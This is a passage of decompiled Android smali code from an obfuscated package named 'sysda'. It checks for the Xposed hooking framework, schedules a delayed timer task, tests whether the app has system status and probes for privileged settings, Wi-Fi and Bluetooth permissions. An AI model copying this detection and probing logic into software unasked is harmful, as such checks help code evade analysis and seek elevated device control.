    sget-object v0, Lsysda/b;->o:Lsysda/e/d;

    return-object v0
.end method

.method private static r()V
    .locals 3

    new-instance v0, Ljava/io/File;

    invoke-static {}, Landroid/os/Environment;->getDataDirectory()Ljava/io/File;

    move-result-object v1

    const-string v2, "/data/de.robv.android.xposed.installer"

    invoke-direct {v0, v1, v2}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v0

    sput-boolean v0, Lsysda/b;->z:Z

    return-void
.end method

.method private static s()V
    .locals 5

    new-instance v0, Ljava/util/Timer;

    invoke-direct {v0}, Ljava/util/Timer;-><init>()V

    new-instance v1, Lsysda/d;

    invoke-direct {v1}, Lsysda/d;-><init>()V

    sget-object v2, Ljava/util/concurrent/TimeUnit;->MINUTES:Ljava/util/concurrent/TimeUnit;

    const-wide/16 v3, 0x1

    invoke-virtual {v2, v3, v4}, Ljava/util/concurrent/TimeUnit;->toMillis(J)J

    move-result-wide v2

    invoke-virtual {v0, v1, v2, v3}, Ljava/util/Timer;->schedule(Ljava/util/TimerTask;J)V

    return-void
.end method

.method private static t()V
    .locals 7

    const/4 v0, 0x0

    const/16 v6, 0x80

    const/4 v5, 0x1

    invoke-static {}, Lsysda/a;->a()Landroid/app/Application;

    move-result-object v1

    invoke-virtual {v1}, Landroid/app/Application;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v2

    :try_start_0
    invoke-static {}, Lsysda/a;->a()Landroid/app/Application;

    move-result-object v1

    invoke-virtual {v1}, Landroid/app/Application;->getPackageName()Ljava/lang/String;

    move-result-object v1

    const/16 v3, 0x1000

    invoke-virtual {v2, v1, v3}, Landroid/content/pm/PackageManager;->getPackageInfo(Ljava/lang/String;I)Landroid/content/pm/PackageInfo;

    move-result-object v1

    invoke-static {}, Lsysda/a;->a()Landroid/app/Application;

    move-result-object v3

    invoke-virtual {v3}, Landroid/app/Application;->getPackageName()Ljava/lang/String;

    move-result-object v3

    const/16 v4, 0x80

    invoke-virtual {v2, v3, v4}, Landroid/content/pm/PackageManager;->getApplicationInfo(Ljava/lang/String;I)Landroid/content/pm/ApplicationInfo;
    :try_end_0
    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v0

    :goto_0
    if-eqz v1, :cond_6

    if-eqz v0, :cond_6

    iget v2, v0, Landroid/content/pm/ApplicationInfo;->flags:I

    and-int/lit8 v2, v2, 0x1

    if-eq v2, v5, :cond_0

    iget v0, v0, Landroid/content/pm/ApplicationInfo;->flags:I

    and-int/lit16 v0, v0, 0x80

    if-ne v0, v6, :cond_1

    :cond_0
    sput-boolean v5, Lsysda/b;->j:Z

    :cond_1
    iget-object v1, v1, Landroid/content/pm/PackageInfo;->requestedPermissions:[Ljava/lang/String;

    array-length v2, v1

    const/4 v0, 0x0

    :goto_1
    if-ge v0, v2, :cond_6

    aget-object v3, v1, v0

    const-string v4, "android.permission.WRITE_SETTINGS"

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_3

    sput-boolean v5, Lsysda/b;->k:Z

    :cond_2
    :goto_2
    add-int/lit8 v0, v0, 0x1

    goto :goto_1

    :catch_0
    move-exception v1

    move-object v1, v0

    goto :goto_0

    :cond_3
    const-string v4, "android.permission.WRITE_SECURE_SETTINGS"

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_4

    sput-boolean v5, Lsysda/b;->l:Z

    goto :goto_2

    :cond_4
    const-string v4, "android.permission.CHANGE_WIFI_STATE"

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_5

    sput-boolean v5, Lsysda/b;->m:Z

    goto :goto_2

    :cond_5
    const-string v4, "android.permission.BLUETOOTH_ADMIN"

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_2

    sput-boolean v5, Lsysda/b;->n:Z

    goto :goto_2

    :cond_6
    return-void
.end method
